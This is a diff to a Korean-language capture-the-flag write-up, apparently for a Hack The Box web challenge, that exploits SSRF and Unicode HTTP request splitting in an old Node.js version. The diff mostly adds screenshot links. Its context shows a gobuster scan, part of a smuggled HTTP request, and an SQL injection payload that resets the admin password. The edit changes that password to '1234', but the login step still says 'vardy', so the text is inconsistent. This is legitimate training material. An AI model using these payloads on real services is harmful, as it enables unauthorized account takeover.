@@ -3,7 +3,8 @@
 
 **Target IP**: 94.237.57.211:37932  
 **Difficulty**: Medium  
-**Objective**: Exploit SSRF and HTTP request splitting vulnerability in Node.js to gain admin access and capture the flag.
+**Objective**: Exploit SSRF and HTTP request splitting vulnerability in Node.js to gain admin access and capture the flag.  
+![webpage](img/webpage.png)
 
 ---
 
@@ -18,6 +19,7 @@
 ```bash
 gobuster dir -u http://94.237.57.211:37932/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
 ```
+![gobuster](img/gobuster.png)
 
 → 결과:
 
@@ -30,7 +32,9 @@ gobuster dir -u http://94.237.57.211:37932/ -w /usr/share/wordlists/dirb/common.
 
 ## 🔐 로그인 및 회원가입 페이지
 
-- `/login`, `/register` 페이지 모두 존재
+- `/login`, `/register` 페이지 모두 존재  
+![register](img/register.png)
+
 - 기본 SQL Injection 시도 실패:
 
 ```text
@@ -42,7 +46,8 @@ pw: 1234
 
 ## 🔍 소스 코드 분석 결과
 
-### 📁 /routes/index.js
+### 📁 /routes/index.js  
+![registerpost](img/registerpost.png)
 
 ```js
 // /register
@@ -53,7 +58,8 @@ if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
 
 → 회원가입 요청은 **localhost(127.0.0.1)** 에서만 가능 → **SSRF로 우회 가능**
 
-### 📁 /login
+### 📁 /login  
+![loginpost](img/loginpost.png)
 
 ```js
 if (admin) return res.send(fs.readFileSync('/app/flag').toString());
@@ -65,7 +71,8 @@ if (admin) return res.send(fs.readFileSync('/app/flag').toString());
 
 ## 🧠 SSRF 취약점 분석
 
-### 📁 helpers/WeatherHelper.js
+### 📁 helpers/WeatherHelper.js  
+![WeatherHelper](img/WeatherHelper.png)
 
 ```js
 let apiKey = '10a62430af617a949055a46fa6dec32f';
@@ -76,10 +83,13 @@ let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?
 
 ---
 
-## ⚙️ Node.js SSRF + HTTP Request Splitting
+## ⚙️ Node.js SSRF + HTTP Request Splitting  
+![packagejson](img/packagejson.png)
 
 - Node.js v8.12.0 (구버전)
-- [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116) - Unicode를 이용한 Request Splitting
+- [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116) - Unicode를 이용한 Request Splitting  
+![CVE](img/CVE.png)  
+![cve-2018](img/cve-2018.png)
 
 ### 🧪 페이로드 예시
 
@@ -92,14 +102,15 @@ HOST: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 126
 
-username=admin&password=asd') ON CONFLICT (username) DO UPDATE SET password='vardy'--
+username=admin&password=asd') ON CONFLICT (username) DO UPDATE SET password='1234'--
 ```
 
-→ `admin` 사용자의 비밀번호를 **vardy**로 변경
+→ `admin` 사용자의 비밀번호를 **1234**로 변경
 
 ---
 
-## 🚀 exploit.py 코드
+## 🚀 exploit.py 코드  
+![exploit](img/exploit.png)
 
 ```python
 import requests
@@ -137,7 +148,8 @@ print(response.text)
 ## ✅ 결과 확인
 
 - 로그인 페이지 접속 → `admin / vardy` 입력
-- 로그인 성공 시 플래그 출력
+- 로그인 성공 시 플래그 출력  
+![flag](img/flag.png)
 
 ```
 HTB{w3lc0m3_t0_th3_p1p3_dr34m}
